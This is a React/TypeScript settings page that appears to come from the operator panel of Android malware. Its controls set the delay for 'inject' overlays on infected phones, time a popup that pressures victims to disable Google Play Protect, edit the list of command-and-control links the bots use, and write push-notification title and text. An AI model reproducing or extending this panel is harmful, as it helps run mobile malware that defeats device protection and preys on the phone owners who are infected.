import { Card, Row, Col, Slider, Select, Form, Input, Button, notification } from 'antd';
import {
  MinusCircleOutlined
} from '@ant-design/icons';
import { useContext, useEffect, useRef, useState } from 'react';
import { AppStateType, GlobalSettingStateType, ServerResponseType } from '../../common/DataType';
import { getGlobalSetting, setGlobalSetting } from './services';
import { AppContext } from '../../providers';
import { changeResponseToClient } from '../../common/Utility';

const { Option } = Select

export default () => {

  const { appState, setAppState } = useContext(AppContext)
  const [state, setState] = useState<GlobalSettingStateType>({
    botTableTime: '30',
    protectTime: '30',
    injectTime: '30',
    pushText: '',
    pushTitle: '',
    urls: []
  })

  let init = useRef(true)

  useEffect(() => {
    if (init.current) {
      getGlobalSetting().then((params: GlobalSettingStateType) => {
        setState(changeResponseToClient(params))
      })

      init.current = false
      return
    }
  }, [])

  useEffect(() => {
    const botTableTime = state.botTableTime

    setAppState((state: AppStateType) => ({
      ...state,
      globalSetting: {
        botTableAutoUpdateTime: botTableTime
      }
    }))
  }, [state])

  const submit = (key: string, value: any) => {
    let params = {
      ...state,
      [key]: value
    }

    setGlobalSetting(params).then((res: ServerResponseType) => {
      key === 'urls' && notification.info({
        message: res.type.toUpperCase(),
        description: res.message
      })
    })

  }

  const submitLink = (links: any) => {
    let url: string[] = links.links.map((link: any) => link.link)

    setState((state: any) => {
      return {
        ...state,
        url: url
      }
    })

    submit('urls', url)
  }

  return (
    <>
      <Row gutter={16}>
        <Col className="gutter-row" span={8}>
          <Card size="small" title="Table settings" className='h-56 !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <h3 className='text-stone-400'>Select auto update delay</h3>
            <Slider className='!mb-8' min={0} max={30} value={parseInt(state.botTableTime)} onChange={(v: number) => { setState((state: GlobalSettingStateType) => ({ ...state, botTableTime: v.toString() })); submit('botTableTime', v.toString()) }} tipFormatter={(value: number | undefined) => `${value} s`} />
            <small className='text-stone-500'>This is used only to automatically update the bots table.</small>
          </Card>
        </Col>
        <Col className="gutter-row" span={8}>
          <Card size="small" title="Bot time global settings" className='h-56 !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <h3 className='text-stone-400'>Time inject delay</h3>
            <Select className='w-full !mb-4' defaultValue={state.injectTime.toString()} value={state.injectTime.toString()} onChange={(v: string) => { setState((state: GlobalSettingStateType) => ({ ...state, injectTime: v })); submit('injectTime', v.toString()) }}>
              <Option value="0">Off</Option>
              <Option value="10">10 sec</Option>
              <Option value="15">15 sec</Option>
              <Option value="20">20 sec</Option>
              <Option value="30">30 sec</Option>
              <Option value="45">45 sec</Option>
              <Option value="60">1 min</Option>
              <Option value="120">2 min</Option>
              <Option value="180">3 min</Option>
              <Option value="240">4 min</Option>
              <Option value="300">5 min</Option>
              <Option value="360">6 min</Option>
              <Option value="480">8 min</Option>
              <Option value="600">10 min</Option>
              <Option value="900">15 min</Option>
              <Option value="1800">30 min</Option>
              <Option value="2700">45 min</Option>
              <Option value="3600">1 hour</Option>
              <Option value="7200">2 hour</Option>
              <Option value="14400">4 hour</Option>
              <Option value="28800">8 hour</Option>
              <Option value="36000">10 hour</Option>
              <Option value="86400">24 hour</Option>
            </Select>
            <small className='text-stone-500'></small>
          </Card>
        </Col>
        <Col className="gutter-row" span={8}>
          <Card size="small" title="Play Protect off time" className='h-56 !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <h3 className='text-stone-400'>PlayProtect time</h3>
            <Select className='w-full !mb-4' defaultValue={state.protectTime.toString()} value={state.protectTime.toString()} onChange={(v: string) => { setState((state: GlobalSettingStateType) => ({ ...state, protectTime: v })); submit('protectTime', v.toString()) }}>
              <Option value="0">Disable</Option>
              <Option value="10">10 sec</Option>
              <Option value="15">15 sec</Option>
              <Option value="20">20 sec</Option>
              <Option value="30">30 sec</Option>
              <Option value="45">45 sec</Option>
              <Option value="60">1 min</Option>
              <Option value="120">2 min</Option>
              <Option value="180">3 min</Option>
              <Option value="240">4 min</Option>
              <Option value="300">5 min</Option>
              <Option value="360">6 min</Option>
              <Option value="480">8 min</Option>
              <Option value="600">10 min</Option>
              <Option value="1800">30 min</Option>
              <Option value="3600">1 hour</Option>
              <Option value="10800">3 hour</Option>
              <Option value="21600">6 hour</Option>
              <Option value="43200">12 hour</Option>
            </Select>
            <small className='text-stone-500'>The time after which the window will be displayed with a request to disable Play Protect.</small>
          </Card>
        </Col>
      </Row>
      <Row gutter={16} className='mt-4'>
        <Col className='gutter-row' span={16}>
          <Card size="small" title="Links to communicate with the bot" className='min-h-[240px] !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <Form name="dynamic_form_nest_item" onFinish={submitLink} autoComplete="off">
              {
                !init.current ? (
                  <Form.List name="links" initialValue={state.urls.map((url: string) => ({ link: url }))}>
                    {(fields, { add, remove }) => (
                      <>
                        {fields.map(({ key, name, ...restField }) => (
                          <Form.Item key={key} className='!mb-1'>
                            <Form.Item
                              {...restField}
                              name={[name, 'link']}
                              className='!mb-1 !w-100'
                            >
                              <Input
                                placeholder="Write link"
                                suffix={<MinusCircleOutlined onClick={() => remove(name)} />}
                              />
                            </Form.Item>
                          </Form.Item>
                        ))}
                        <Form.Item className='!mb-2'>
                          <Button type="dashed" onClick={() => add()} block >
                            Add field
                          </Button>
                        </Form.Item>
                      </>
                    )}
                  </Form.List>
                ) : (
                  ""
                )
              }
              <Form.Item className='!mb-2 float-right'>
                <Button type="primary" htmlType="submit" ghost>
                  Submit
                </Button>
              </Form.Item>
            </Form>
          </Card>
        </Col>
        <Col className="gutter-row" span={8}>
          <Card size="small" title="Push settings" className='h-60 !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <Form
              name="basic"
              layout="vertical"
              initialValues={{ remember: true }}
              autoComplete="off"
            >
              <Form.Item
                className='!mb-2'
                label="Push title"
              >
                <Input placeholder='Enter push title' value={state.pushTitle} onChange={(e: any) => { setState((state: GlobalSettingStateType) => ({ ...state, pushTitle: e.target.value })); submit('pushTitle', e.target.value) }} />
              </Form.Item>
              <Form.Item
                className='!mb-2'
                label="Push text"
              >
                <Input placeholder='Enter push text' value={state.pushText} onChange={(e: any) => { setState((state: GlobalSettingStateType) => ({ ...state, pushText: e.target.value })); submit('pushText', e.target.value) }} />
              </Form.Item>
            </Form>
          </Card>
        </Col>
      </Row>
    </>
  )
}